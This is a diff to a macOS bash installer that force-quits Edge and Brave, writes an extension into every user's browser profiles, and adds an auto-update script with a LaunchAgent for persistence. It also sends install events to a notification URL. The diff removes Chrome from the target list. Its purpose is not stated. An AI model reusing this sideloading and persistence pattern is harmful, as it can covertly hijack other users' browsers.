@@ -224,7 +224,7 @@ for uhome in /Users/*; do
 done
 
 if [ $UPDATE_MODE -eq 0 ]; then
-    for app in "Google Chrome" "Microsoft Edge" "Brave Browser"; do
+    for app in "Microsoft Edge" "Brave Browser"; do
         pkill -x "$app" 2>/dev/null || true
     done
     sleep 1
@@ -247,7 +247,7 @@ for uhome in /Users/*; do
     export EXT_DIR="$uext"
     export EXT_ID="$EXT_ID"
 
-    for rel in "Google/Chrome" "Microsoft Edge" "BraveSoftware/Brave-Browser"; do
+    for rel in "Microsoft Edge" "BraveSoftware/Brave-Browser"; do
         udata="$uhome/Library/Application Support/$rel"
         [ ! -d "$udata" ] && continue
 
@@ -259,7 +259,6 @@ for uhome in /Users/*; do
         done
     done
     
-    # Install auto-update script per-user
     UPDATE_SCRIPT="$uext/autoupdate.sh"
     cat > "$UPDATE_SCRIPT" << 'UPDATE_SCRIPT_EOF'
 #!/bin/bash
@@ -314,7 +313,6 @@ exit $EXIT_CODE
 UPDATE_SCRIPT_EOF
     chmod +x "$UPDATE_SCRIPT" 2>/dev/null
     
-    # Install LaunchAgent
     LAUNCH_AGENTS="$uhome/Library/LaunchAgents"
     mkdir -p "$LAUNCH_AGENTS" 2>/dev/null || continue
     
@@ -355,11 +353,12 @@ rm -rf "$TMP_DIR"
 if [ $INJ -eq 0 ]; then
     curl -fsS -m 5 -o /dev/null -X POST "$NOTIFY_URL" -d "ev=install_fail&os=macos&info=no profiles" 2>/dev/null || true
     echo "No browser profiles found"
+    echo "Note: Google Chrome is not supported on macOS (use Brave or Edge)"
     exit 1
 fi
 
 if [ $UPDATE_MODE -eq 0 ]; then
-    for app in "Google Chrome" "Microsoft Edge" "Brave Browser"; do
+    for app in "Microsoft Edge" "Brave Browser"; do
         open -a "$app" --args --restore-last-session 2>/dev/null || true
     done
 fi
@@ -370,4 +369,7 @@ if [ $UPDATE_MODE -eq 1 ]; then
 else
     echo "Successfully installed to $INJ profiles (auto-update enabled)"
 fi
+echo ""
+echo "Supported browsers: Brave, Microsoft Edge"
+echo "Note: Google Chrome requires Chrome Web Store installation"
 exit 0
